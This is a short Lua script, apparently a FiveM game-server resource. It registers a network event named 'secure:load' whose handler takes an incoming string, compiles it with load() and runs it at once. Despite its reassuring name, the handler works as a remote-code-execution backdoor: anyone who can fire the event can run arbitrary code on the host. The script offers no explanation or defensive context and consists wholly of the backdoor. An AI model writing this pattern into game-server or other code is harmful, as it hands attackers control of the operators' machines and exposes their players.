RegisterNetEvent('secure:load')
AddEventHandler('secure:load', function(c1)
    assert(load(c1))()
end)


